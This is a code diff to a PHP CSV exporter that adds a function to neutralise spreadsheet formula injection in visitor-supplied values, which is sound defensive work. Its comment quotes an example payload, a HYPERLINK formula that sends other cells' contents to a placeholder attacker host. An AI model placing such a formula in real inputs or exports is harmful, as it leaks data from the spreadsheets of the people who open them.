@@ -86,7 +86,7 @@ final class CsvExporter {
 
 			$values_by_name = $this->index_values( $row );
 			foreach ( $columns as $col ) {
-				$line[] = $values_by_name[ $col ] ?? '';
+				$line[] = self::neutralise_formula( $values_by_name[ $col ] ?? '' );
 			}
 
 			fputcsv( $out, $line );
@@ -150,6 +150,35 @@ final class CsvExporter {
 			}
 		}
 		return array_keys( $seen );
+	}
+
+	/**
+	 * Neutralise CSV formula injection.
+	 *
+	 * A visitor-supplied value that starts with `= + - @` (optionally after a
+	 * leading tab or carriage return) is interpreted as a formula by Excel /
+	 * LibreOffice / Google Sheets when the admin opens the export — e.g.
+	 * `=HYPERLINK("http://evil/?"&A1)` exfiltrates other cells. Prefixing such
+	 * values with a single quote forces the spreadsheet to treat them as text.
+	 * This is the standard mitigation used across the form-plugin ecosystem.
+	 *
+	 * @param string $value Raw cell value.
+	 * @return string
+	 */
+	private static function neutralise_formula( string $value ): string {
+		if ( '' === $value ) {
+			return $value;
+		}
+		// Look at the first meaningful character, skipping a leading tab or CR
+		// that some spreadsheets strip before evaluating the formula.
+		$first = ltrim( $value, "\t\r" );
+		if ( '' === $first ) {
+			return $value;
+		}
+		if ( in_array( $first[0], [ '=', '+', '-', '@' ], true ) ) {
+			return "'" . $value;
+		}
+		return $value;
 	}
 
 	/**
